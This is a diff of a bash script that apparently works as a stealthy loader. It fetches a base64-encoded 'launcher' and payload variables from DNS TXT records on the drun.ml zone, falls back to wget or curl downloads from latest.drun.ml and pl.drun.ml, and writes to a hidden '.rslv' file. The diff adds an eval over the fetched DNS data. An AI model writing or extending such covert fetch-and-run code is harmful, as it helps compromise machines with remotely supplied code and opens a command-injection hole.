@@ -39,38 +39,47 @@ parsedata() {
 }
 
 querydns() {
+    local var=$1
     dig="$dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
-    $dig @1.1.1.1 || $dig @8.8.8.8 || $dig
+    eval "$var=$($dig @1.1.1.1) || $var=$($dig @8.8.8.8) || $var=$($dig)"
 }
 
 endpoints() {
     chunksize=2047 # 1 char for order
     zone=${lr_zone:-drun.ml}
     record=${lr_record:-d}
-    data=$(querydns)
+    querydns data
     parsedata
     launcher=${data}
     launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
+    [ -z "$launcher" ] && endpoints_fallback launcher
     # script_url=$(dig txt latest.drun.ml +short)
     zone=${pl_zone:-drun.ml}
     record=${pl_record:-plvars}
-    pl_vars=$(querydns)
+    querydns pl_vars
     pl_vars=${pl_vars/\"}
     pl_vars=${pl_vars%\"}
     pl_vars=${pl_vars//\\\"/\"}
+    [ -z "$pl_vars" ] && endpoints_fallback pl_vars
 }
 
 endpoints_fallback() {
-    script_url=http://latest.drun.ml
-    token_url=https://pl.drun.ml
-    data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
-    [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
-    # parsedata
-    launcher=${data}
-    pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
-    pl_vars=${pl_vars#*\/}
-    pl_vars=${pl_vars//\"&/\" }
-    pl_vars=${pl_vars//%3F/\?}
+    case "$1" in
+        launcher)
+            script_url=http://latest.drun.ml
+            token_url=https://pl.drun.ml
+            data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
+            [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
+            # parsedata
+            launcher=${data}
+            ;;
+        pl_vars)
+            pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
+            pl_vars=${pl_vars#*\/}
+            pl_vars=${pl_vars//\"&/\" }
+            pl_vars=${pl_vars//%3F/\?}
+            ;;
+    esac
 }
 
 filename=".rslv"
